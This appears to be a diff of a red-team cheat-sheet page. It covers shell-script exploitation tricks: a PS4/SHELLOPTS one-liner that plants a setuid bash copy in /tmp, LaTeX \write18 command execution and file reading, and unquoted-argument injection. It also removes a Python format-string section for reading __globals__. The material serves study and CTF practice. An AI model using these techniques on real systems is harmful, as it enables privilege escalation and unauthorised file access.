@@ -150,7 +150,7 @@ $ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./scr
 
 <div class="row row-cols-lg-2"><div>
 
-As a reminder, if you can execute commands, then refer to [command injection](/cybersecurity/red-team/s3.exploitation/vulns/injection/command.md) for a list of tips and tricks.
+As a reminder, if you can execute commands, then refer to [command injection](/cybersecurity/red-team/s3.exploitation/vulns/injection/command.md) for additional related content. Refer also to: [format strings](/cybersecurity/red-team/s3.exploitation/vulns/memory/format_strings.md).
 
 <br>
 
@@ -175,8 +175,7 @@ If we can compile LaTeX, we may be able to
 
 * Execute commands (`\immediate\write18{xxx > buffer}`, `\verbatiminput{buffer}` or using `xxx 1>&2`).
 * Read non-LaTeX files using `\input{path_to_file}` or using `\usepackage{verbatim} \verbatiminput{myfile.txt}` (comments)
-
-<br>
+</div><div>
 
 #### Bash Script Arguments
 
@@ -188,41 +187,6 @@ If the script uses the argument without quoting them nor validating them, we may
 $ cat xxx.sh
 ls $1
 $ ./xxx.sh "-la ."
-```
-</div><div>
-
-#### Python format() function
-
-[![python_format_string](../../../../_badges/hacktricks/generic_methodologies_and_resources/python/bypass_python_sandboxes/python_format_string.svg)](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-format-string)
-[![python_format_string](../../../../_badges/rootme/app_script/python_format_string.svg)](https://www.root-me.org/en/Challenges/App-Script/Python-format-string)
-
-The python format function may be exploited to access variables from the code and display them. In the example below, we access the method `__init__` while any methods of the class would work. We can then relatively access other members of the class, or move up and access members of the parent `global` namespace.
-
-```py
-class X:
-   pass
-       
-instance = X()
-"{x.__init__}".format(x=x)
-"{x.__init__.__globals__}".format(x=x)
-"{x.__init__.__globals__[X]}".format(x=x)
-"{x.__init__.__globals__[X][index]}".format(x=x) # one by one
-```
-
-We can alternatively use error messages.
-
-* Since Python `3.10`, an additional message body was added when using an invalid string after "`:`".
-
-```py
->>> "{x:toto}".format(x=5)
-# ValueError: Invalid format specifier 'toto' for object of type 'int'
-```
-
-* For every version of python, an exception is raised when we use an unknown format code <small>(e.g. `s` for string, as in "%s")</small>.
-
-```py
->>> "{x:s}".format(x=5)
-# ValueError: Unknown format code 's' for object of type 'int'
 ```
 </div></div>
 
